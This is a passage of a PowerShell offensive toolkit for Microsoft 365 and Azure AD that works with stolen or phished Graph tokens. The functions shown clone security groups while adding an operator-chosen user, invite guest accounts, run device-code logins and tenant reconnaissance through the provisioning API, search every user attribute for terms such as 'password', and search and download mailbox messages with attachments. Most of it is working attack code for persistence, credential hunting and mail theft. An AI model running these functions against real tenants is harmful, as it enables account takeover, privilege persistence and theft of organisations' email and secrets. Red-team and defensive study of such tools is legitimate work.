    $secgroups = Get-SecurityGroups -AccessToken $accessToken
    $secgroups
    $CloneGroup = ""
    while($CloneGroup -eq ""){
    Write-Host -ForegroundColor Cyan "[*] Enter a group name you want to clone:"
    $CloneGroup = Read-Host 

    if ($secgroups.GroupName -contains $CloneGroup) {
        Write-Host -ForegroundColor yellow ("[*] Found group " + $CloneGroup)
    } else {
        Write-Output "Invalid group try again."
        $CloneGroup = ""
    }
    }

    $memberIds = @()
    foreach ($group in $secgroups){
        If ($group.GroupName -eq $cloneGroup){
            $memberlist = $group.memberIds.split(",")
            foreach($member in $memberlist){
                $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $member )
            }
        }
    }
    Write-Host -ForegroundColor Cyan "[*] Do you want to add your current user to the cloned group? (Yes/No)"
    $answer = Read-Host 
    $answer = $answer.ToLower()
    if ($answer -eq "yes" -or $answer -eq "y") {
        Write-Host -ForegroundColor yellow "[*] Adding current user to the cloned group..."
        $currentuser = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
        $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $currentuser.Id)
    } elseif ($answer -eq "no" -or $answer -eq "n") {
        Write-Output "[*] Not adding your user"
    } else {
        Write-Output "Invalid input. Please enter Yes or No."
    }

    Write-Host -ForegroundColor Cyan "[*] Do you want to add a different user to the cloned group? (Yes/No)"
    $difanswer = Read-Host 
    $difanswer = $difanswer.ToLower()
    if ($difanswer -eq "yes" -or $difanswer -eq "y") {
        Write-Host -ForegroundColor Cyan "[*] What is the email address of the user you want to add?"
        $useranswer = Read-Host 
        $useranswer = $useranswer.ToLower()
        Write-Host -ForegroundColor yellow "[*] Adding $useranswer to the cloned group..."
        $uri = "https://graph.microsoft.com/v1.0/users"
        $filter = "?`$filter=mail eq '$useranswer'"
        $otheruserid = Invoke-RestMethod -Uri "$uri$filter" -Headers $headers
        $userObjectId = $otheruserid.value[0].id
        $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $userObjectId)
    } elseif ($difanswer -eq "no" -or $difanswer -eq "n") {
        Write-Output "[*] Not adding another user"
    } else {
        Write-Output "Invalid input. Please enter Yes or No."
    }

    Write-Host -ForegroundColor Cyan "[*] Do you want to change the group name or keep as is? ($CloneGroup)"
    $groupanswer = Read-Host 
    $groupanswer = $groupanswer.ToLower()
    if ($groupanswer -eq "yes" -or $groupanswer -eq "y") {
        Write-Host -ForegroundColor yellow "[*] What do you want the group name to be?"
        $CloneGroup = Read-Host
    } elseif ($groupanswer -eq "no" -or $groupanswer -eq "n") {
        Write-host ('[*] Keeping the name "' + $CloneGroup + '"')
    } else {
        Write-Output "Invalid input. Please enter Yes or No."
    }


    $memberIdsUniq = $memberIds | Select-Object -Unique

    Create-SecurityGroupWithMembers -AccessToken $accessToken -DisplayName $CloneGroup -MemberIds $memberIdsUniq
}



function Invoke-InviteGuest{

<#
    .SYNOPSIS
        Invites a guest user to an Azure Active Directory tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        Invites a guest user to an Azure Active Directory tenant.

    .PARAMETER Tokens

        Token object for auth

    .PARAMETER DisplayName
    
        The name you want displayed in the Azure directory for the user (ex. "Beau Bullock")
        
    .PARAMETER EmailAddress
    
        The email address of the user you want to invite
        
    .PARAMETER RedirectUrl 
    
        A redirect url that you want to redirect the guest to upon accepting the invite. Leave blank to use the default
        
    .PARAMETER SendInvitationMessage
    
        Option to send an email to the invited user or not
        
    .PARAMETER CustomMessageBody
    
        Change the message body sent in the invite 

    .EXAMPLES      
        
        C:\PS> Invoke-InviteGuest -Tokens $tokens -DisplayName "Lord Voldemort" -EmailAddress "iamlordvoldemort@31337schoolofhackingandwizardry.com"
#>

    Param(

    [Parameter(Position = 0, Mandatory = $False)]
    [string]
    $DisplayName = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $EmailAddress = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $RedirectUrl = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $SendInvitationMessage = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $CustomMessageBody = "",

    [Parameter(Position = 5, Mandatory = $False)]
    [object[]]
    $Tokens = ""

    )
    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 
    $headers = @{"Authorization" = "Bearer $accesstoken"}
    # Construct the Graph API endpoint
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    $orginfo = Invoke-RestMethod -Uri "$graphApiUrl/organization" -Headers $headers
    $tenantid = $orginfo.value.id


    # Prompt user for input
    if(!$EmailAddress){
    $EmailAddress = Read-Host "Enter the Email Address to Invite"
    }

    if(!$DisplayName){
    $DisplayName = Read-Host "Enter the Display Name"
    }

    if(!$RedirectUrl){
    $RedirectUrl = Read-Host "Enter the Redirect URI (leave blank to use the default)"
    }
    if($RedirectUrl -eq ""){
    $RedirectUrl = ("https://myapplications.microsoft.com/?tenantid=" + $tenantid)
    }

    if(!$SendInvitationMessage){
    $SendInvitationMessage = Read-Host "Send an Email Invitation? (true/false)"
    }

    if (!$CustomMessageBody){
    $CustomMessageBody = Read-Host "Enter a custom message body or leave blank"
    }

    # Construct the JSON payload
    $invitationData = @{
        invitedUserEmailAddress = $EmailAddress
        invitedUserDisplayname = $Displayname
        inviteRedirectUrl = $RedirectUrl
        sendInvitationMessage = [System.Convert]::ToBoolean($SendInvitationMessage)
        invitedUserMessageInfo = @{
            customizedMessageBody = $MessageBody
        }
    }

    # Convert to JSON format
    $invitationJson = $invitationData | ConvertTo-Json


    # Make the POST request
    $response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/invitations" -Method Post -Headers $headers -Body $invitationJson

    # Check the response
    if ($response -ne $null) {
        Write-Host -ForegroundColor Green "[*] External user invited sent successfully."
        Write-Host ("Display Name: " + $response.invitedUserDisplayName)
        Write-Host ("Email Address: " + $response.invitedUserEmailAddress)
        Write-Host ("Object ID: " + $response.invitedUser.id)
        Write-Host ("Invite Redeem URL: " +  $response.inviteRedeemUrl)
    } else {
        Write-Error "Error sending invitation."
    }
}



function Invoke-GraphRecon{

    <#
        .SYNOPSIS
            PowerShell module to perform general recon via the Azure AD Graph API.
            Author: Beau Bullock (@dafthack)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
        
           PowerShell module to perform general recon via the Azure AD Graph API.

        .EXAMPLES      
        
            C:\PS> Invoke-GraphRecon -Tokens $tokens
    #>

    param(
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens = "",
        [switch]
        $GraphRun
    )
    if($Tokens){
        if(!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
            Write-Host -ForegroundColor Yellow "[*] Refreshing token to the Azure AD Graph API..."
        }
        $accesstoken = $tokens.access_token
        $refreshtoken = $tokens.refresh_token
        
        $RefreshToken = $tokens.refresh_token
        $authUrl = "https://login.microsoftonline.com/$tenantid"
        $refreshbody = @{
                "resource" = "https://graph.windows.net"
                "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                "grant_type" =    "refresh_token"
                "refresh_token" = $RefreshToken
                "scope"=         "user_impersonation"
            }

    try{
    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    Write-Output $details.error
    }
    if($reftokens)
            {
               $aadtokens = $reftokens
               $access_token = $aadtokens.access_token
            }
    }
    else{

    # Login
        Write-Host -ForegroundColor yellow "[*] Initiating a device code login."

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.windows.net"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
            "scope" = "user_impersonation"
        }
        try{
        $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($aadtokens)
            {
                Write-Host "[*] Successful auth"
                $access_token = $aadtokens.access_token
                break
            }
        Start-Sleep -Seconds 3
    }
    }

    # Generate unique GUIDs
    $messageId = [guid]::NewGuid()
    $trackingHeader = [guid]::NewGuid()
    $clientId = "50afce61-c917-435b-8c6d-60aa5a8b8aa7"



$soapRequest = @"
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://provisioning.microsoftonline.com/IProvisioningWebService/MsolConnect</a:Action>
    <a:MessageID>urn:uuid:$messageId</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <UserIdentityHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BearerToken xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$access_token</BearerToken>
      <LiveToken i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService"/>
    </UserIdentityHeader>
    <ClientVersionHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <ClientId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$clientId</ClientId>
      <Version xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">1.2.183.57</Version>
    </ClientVersionHeader>
    <ContractVersionHeader xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BecVersion xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Version47</BecVersion>
    </ContractVersionHeader>
    <TrackingHeader xmlns="http://becwebservice.microsoftonline.com/">$trackingHeader</TrackingHeader>
    <a:To s:mustUnderstand="1">https://provisioningapi.microsoftonline.com/provisioningwebservice.svc</a:To>
  </s:Header>
  <s:Body>
    <MsolConnect xmlns="http://provisioning.microsoftonline.com/">
      <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
        <b:BecVersion>Version4</b:BecVersion>
        <b:TenantId i:nil="true"/>
        <b:VerifiedDomain i:nil="true"/>
      </request>
    </MsolConnect>
  </s:Body>
</s:Envelope>
"@

    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Now trying to query the MS provisioning API for organization settings."
    }
    # Send the SOAP request to the provisioningwebservice
    $response = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $soapRequest


    if ($response -match '<DataBlob[^>]*>(.*?)<\/DataBlob>') {
        $dataBlob = $Matches[1]
    } else {
        Write-Host "DataBlob not found in the response."
    }

    $messageID = [guid]::NewGuid()
    $trackingHeader = [guid]::NewGuid()

$GetCompanyInfoSoapRequest = @"
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://provisioning.microsoftonline.com/IProvisioningWebService/GetCompanyInformation</a:Action>
    <a:MessageID>$MessageID</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <UserIdentityHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BearerToken xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Bearer $access_token</BearerToken>
      <LiveToken i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService"/>
    </UserIdentityHeader>
    <BecContext xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <DataBlob xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$dataBlob</DataBlob>
      <PartitionId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">70</PartitionId>
    </BecContext>
    <ClientVersionHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <ClientId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$ClientId</ClientId>
      <Version xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">1.2.183.57</Version>
    </ClientVersionHeader>
    <ContractVersionHeader xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BecVersion xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Version47</BecVersion>
    </ContractVersionHeader>
    <TrackingHeader xmlns="http://becwebservice.microsoftonline.com/">$TrackingHeader</TrackingHeader>
    <a:To s:mustUnderstand="1">https://provisioningapi.microsoftonline.com/provisioningwebservice.svc</a:To>
  </s:Header>
  <s:Body>
    <GetCompanyInformation xmlns="http://provisioning.microsoftonline.com/">
      <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
        <b:BecVersion>Version16</b:BecVersion>
        <b:TenantId i:nil="true"/>
        <b:VerifiedDomain i:nil="true"/>
      </request>
    </GetCompanyInformation>
  </s:Body>
</s:Envelope>
"@

    $companyinfo = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $GetCompanyInfoSoapRequest


    $xml = [xml]$companyInfo

    # Define namespaces
    $ns = New-Object Xml.XmlNamespaceManager($xml.NameTable)
    $ns.AddNamespace("s", "http://www.w3.org/2003/05/soap-envelope")
    $ns.AddNamespace("b", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService")
    $ns.AddNamespace("c", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration")
    $ns.AddNamespace("d", "http://schemas.microsoft.com/2003/10/Serialization/Arrays")
    $ns.AddNamespace("ns", "http://schemas.microsoft.com/online/serviceextensions/2009/08/ExtensibilitySchema.xsd")


    # Extract data using XPath
    $displayName = $xml.SelectSingleNode("//c:DisplayName", $ns).InnerText
    $street = $xml.SelectSingleNode("//c:Street", $ns).InnerText
    $city = $xml.SelectSingleNode("//c:City", $ns).InnerText
    $state = $xml.SelectSingleNode("//c:State", $ns).InnerText
    $postalCode = $xml.SelectSingleNode("//c:PostalCode", $ns).InnerText
    $Country = $xml.SelectSingleNode("//c:CountryLetterCode", $ns).InnerText
    $TechnicalContact = $xml.SelectSingleNode("//c:TechnicalNotificationEmails", $ns).InnerText
    $Telephone = $xml.SelectSingleNode("//c:TelephoneNumber", $ns).InnerText
    $InitialDomain = $xml.SelectSingleNode("//c:InitialDomain", $ns).InnerText
    $DirSync = $xml.SelectSingleNode("//c:DirectorySynchronizationEnabled", $ns).InnerText
    $DirSyncStatus = $xml.SelectSingleNode("//c:DirectorySynchronizationStatus", $ns).InnerText
    $DirSyncClientMachine = $xml.SelectSingleNode("//c:DirSyncClientMachineName", $ns).InnerText
    $DirSyncServiceAccount = $xml.SelectSingleNode("//c:DirSyncServiceAccount", $ns).InnerText
    $PasswordSync = $xml.SelectSingleNode("//c:PasswordSynchronizationEnabled", $ns).InnerText
    $PasswordReset = $xml.SelectSingleNode("//c:SelfServePasswordResetEnabled", $ns).InnerText
    $UsersPermToConsent = $xml.SelectSingleNode("//c:UsersPermissionToUserConsentToAppEnabled", $ns).InnerText
    $UsersPermToReadUsers = $xml.SelectSingleNode("//c:UsersPermissionToReadOtherUsersEnabled", $ns).InnerText
    $UsersPermToCreateLOBApps = $xml.SelectSingleNode("//c:UsersPermissionToCreateLOBAppsEnabled", $ns).InnerText
    $UsersPermToCreateGroups = $xml.SelectSingleNode("//c:UsersPermissionToCreateGroupsEnabled", $ns).InnerText

    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    Write-Host -ForegroundColor Yellow "Main Contact Info"
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
    # Display the extracted data
    Write-Output "Display Name: $displayName"
    Write-Output "Street: $street"
    Write-Output "City: $city"
    Write-Output "State: $state"
    Write-Output "Postal Code: $postalCode"
    Write-Output "Country: $country"
    Write-Output "Technical Notification Email: $TechnicalContact"
    Write-Output "Telephone Number: $Telephone"
    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    Write-Host -ForegroundColor Yellow "Directory Sync Settings"
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
    Write-Output "Initial Domain: $initialDomain"
    Write-Output "Directory Sync Enabled: $dirSync"
    Write-Output "Directory Sync Status: $dirSyncStatus"
    Write-Output "Directory Sync Client Machine: $dirSyncClientMachine"
    Write-Output "Directory Sync Service Account: $dirSyncServiceAccount"
    Write-Output "Password Sync Enabled: $passwordSync"
    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    Write-Host -ForegroundColor Yellow "User Settings"
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
    Write-Output "Self-Service Password Reset Enabled: $passwordReset"
    Write-Output "Users Can Consent to Apps: $UsersPermToConsent"
    Write-Output "Users Can Read Other Users: $UsersPermToReadUsers"
    Write-Output "Users Can Create Apps: $UsersPermToCreateLOBApps"
    Write-Output "Users Can Create Groups: $UsersPermToCreateGroups"


    # Select the ServiceParameter nodes
    $serviceParameters = $xml.SelectNodes("//ns:ServiceParameter", $ns)
    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    Write-Host -ForegroundColor Yellow "Additional Service Parameters"
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
    # Loop through each ServiceParameter node and extract the Name and Value
    foreach ($parameter in $serviceParameters) {
        $name = $parameter.Name
        $value = $parameter.Value
        Write-Output "$name : $value"
    }
    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
}



function Invoke-SearchUserAttributes{
    <#
     .SYNOPSIS

        This module will query user attributes from the directory and search through them for a specific term.       
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module will query user attributes from the directory and search through them for a specific term.

    .PARAMETER Tokens

        Token object for auth

    .PARAMETER SearchTerm

        The term you want to search across user attributes

    .EXAMPLE
        
        C:\PS> Invoke-SearchUserAttributes -Tokens $tokens -SearchTerm "password"
        -----------
        This will search every user attribute for the term password.

    #>
    Param(

    [Parameter(Position = 0, Mandatory = $False)]
    [object[]]
    $Tokens = "",

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $SearchTerm = ""
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 

    $headers = @{
        Authorization = "Bearer $accessToken"
    }

    $usersEndpoint = "https://graph.microsoft.com/v1.0/users"
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    Write-Host "[*] Now searching each user attribute for the term $searchTerm"
    # Query users
    Write-Host "[*] Gathering the users from the tenant."
    do{
        
        $usersResponse = Invoke-RestMethod -Uri $usersEndpoint -Headers $headers

        $attributes = '?$select=accountEnabled,ageGroup,assignedLicenses,businessPhones,city,companyName,consentProvidedForMinor,country,createdDateTime,creationType,department,displayName,mail,employeeId,employeeHireDate,employeeOrgData,employeeType,onPremisesExtensionAttributes,externalUserStateChangeDateTime,faxNumber,givenName,imAddresses,identities,externalUserState,jobTitle,surname,lastPasswordChangeDateTime,legalAgeGroupClassification,mailNickname,mobilePhone,id,officeLocation,onPremisesSamAccountName,onPremisesDistinguishedName,onPremisesDomainName,onPremisesImmutableId,onPremisesLastSyncDateTime,onPremisesProvisioningErrors,onPremisesSecurityIdentifier,onPremisesSyncEnabled,onPremisesUserPrincipalName,otherMails,passwordPolicies,passwordProfile,preferredDataLocation,preferredLanguage,proxyAddresses,Comment,Info,Password,Information,Description,login,signin,credential,cred,credentials,data,signInSessionsValidFromDateTime,sponsors,state,streetAddress,usageLocation,userPrincipalName,userType,postalCode&$expand=manager'

        
        foreach ($user in $usersResponse.value) {
            $userId = $user.id
            $uri = ($graphApiUrl + "/users/" + $userId + $attributes)
            $userAttributesResponse = Invoke-RestMethod -Uri $uri -Headers $headers
            $upn = $userAttributesResponse.UserPrincipalName
            # Search through attributes (excluding @odata.context)
            $propertiesToSearch = $userAttributesResponse.PSObject.Properties | Where-Object { $_.Name -ne "@odata.context" }
            foreach ($property in $propertiesToSearch) {
                $propertyName = $property.Name
                $propertyValue = $property.Value

                if ($propertyValue -is [string] -and $propertyValue -like "*$searchTerm*") {
                    Write-Host -ForegroundColor green "[*] Found a match! User: $upn in attritube: $propertyName : $propertyValue"
                }

            }
     
        }
        if ($usersResponse.'@odata.nextLink') {
            Write-Host "[*] Gathering more users..."
            $usersEndpoint = $usersResponse.'@odata.nextLink'
        }
        else {
            # No more pages, exit loop
            break
        }
    } while ($true)

}

Function Invoke-SearchMailbox{
    <#
    .SYNOPSIS

        This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox.    
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox. 

    .PARAMETER Tokens

        Token object for auth

    .PARAMETER SearchTerm

        The term you want to search for in the mailbox.

    .PARAMETER MessageCount

        The amount of messages returned in the search results (default = 25)

    .PARAMETER OutFile

        File to output a list of emails to

    .PARAMETER PageResults

        Enables paging to page through results

    .EXAMPLE
        
        C:\PS> Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
        -----------
        This will search through the current user's mailbox for the term password.
    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $SearchTerm = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [string]
    $MessageCount = "25",
    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $OutFile = "",
    [Parameter(Position = 4, Mandatory = $false)]
    [string]
    $DetectorName = "Custom",
    [switch]
    $GraphRun,
    [switch]
    $PageResults
    )


    if($Tokens){
        if(!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        }
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 

    $graphApiUrl = "https://graph.microsoft.com/v1.0/search/query"

    # Define the headers with the access token and content type
    $headers = @{
    "Authorization" = "Bearer $access_token"
    "Content-Type" = "application/json"
    }

    # Define the search query
    $searchQuery = @{ requests = @( @{
        entityTypes = @("message")
        query = @{
            queryString = $searchTerm
        }
        from = 0
        size = $MessageCount
        enableTopResults = "true"
        }
    )
    }

    # Convert the search query to JSON format
    $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10

    # Perform the HTTP POST request to search emails
    $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
    
    # Process the response and display the summary
    $total = $response.value[0].hitsContainers[0].total
    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Found $total matches for search term $searchTerm"
    }
    else{
        if([int]$total -gt 0){
            Write-Host -ForegroundColor yellow "[*] Found $total matches for detector: $DetectorName"
        }
    }
        
    if ($total -eq 0){return}
        
        $moreresults = "True"
        while ($moreresults -like "True") {
            $moreresults = $response.value[0].hitsContainers[0].moreResultsAvailable
            $resultsList = @()
            foreach ($hit in $response.value[0].hitsContainers[0].hits) {
            $subject = $hit.resource.subject
            $sender = $hit.resource.sender.emailAddress.address
            $receivers = $hit.resource.replyTo | ForEach-Object { $_.emailAddress.Name }
            $date = $hit.resource.sentDateTime
            $preview = $hit.resource.bodyPreview

            $LogInfo = @{
                        "Detector Name" = $DetectorName
                        "Subject" = $subject
                        "Sender" = $sender
                        "Receivers" = $receivers
                        "Date" = $date
                        "Preview" = $preview
                    }

            $resultsList += New-Object PSObject -Property $LogInfo

            if(!$GraphRun){

            Write-Output "Subject: $subject | Sender: $sender | Receivers: $($receivers -join ', ') | Date: $date | Message Preview: $preview"
            Write-Host ("=" * 80) 
            }
            }
            if($OutFile){
                if(!$GraphRun){
                    Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
                }
                $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
            }

            if(!$GraphRun){
            while($download -notlike "Yes"){
                Write-Host -ForegroundColor Cyan "[*] Do you want to download these emails and their attachments? (Yes/No)"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Downloading messages..."
                    $download = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    if(!$PageResults){
                        Write-Output "[*] Quitting..."
                    }
                    else{
                        if($moreresults -like "False"){
                            Write-Host -ForegroundColor Yellow "[*] No more results. Quitting..."
                        }
                        else{
                            Write-Host -ForegroundColor yellow "[*] Trying to get next page..."
                        }
                    }
                    break
                } else {
                    Write-Output "Invalid input. Please enter Yes or No."
                }
            }

            if ($download -like "Yes"){
                $emailFileNames = @()
                $folderName = "mailsearch-" + (Get-Date -Format 'yyyyMMddHHmmss')
                New-Item -Path $folderName -ItemType Directory | Out-Null
                # Process the response and export email content
                foreach ($hit in $response.value[0].hitsContainers[0].hits) {
                $webLink = $hit.resource.webLink
                $itemId = [regex]::Match($webLink, "ItemID=([^&]+)").Groups[1].Value
                $subject = $hit.resource.subject

                # Remove special characters and replace spaces with underscores
                $cleanedSubject = $subject -replace '[^\w\s]', '' -replace '\s', '_'
        

                # Fetch email details using the message ID
                Write-Host "[*] Downloading $cleanedSubject"
                $messageDetails = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages/$itemId" -Headers $headers -Method Get
                $dateTimeString = $messageDetails.sentDateTime
                $dateTime = [DateTime]::ParseExact($dateTimeString, "yyyy-MM-ddTHH:mm:ssZ", [System.Globalization.CultureInfo]::InvariantCulture)
                $numericDate = $dateTime.ToString("yyyyMMddHHmmss")
                $filename = ($cleanedSubject + "-" + $numericDate +".json")
                $emailFileNames += $filename
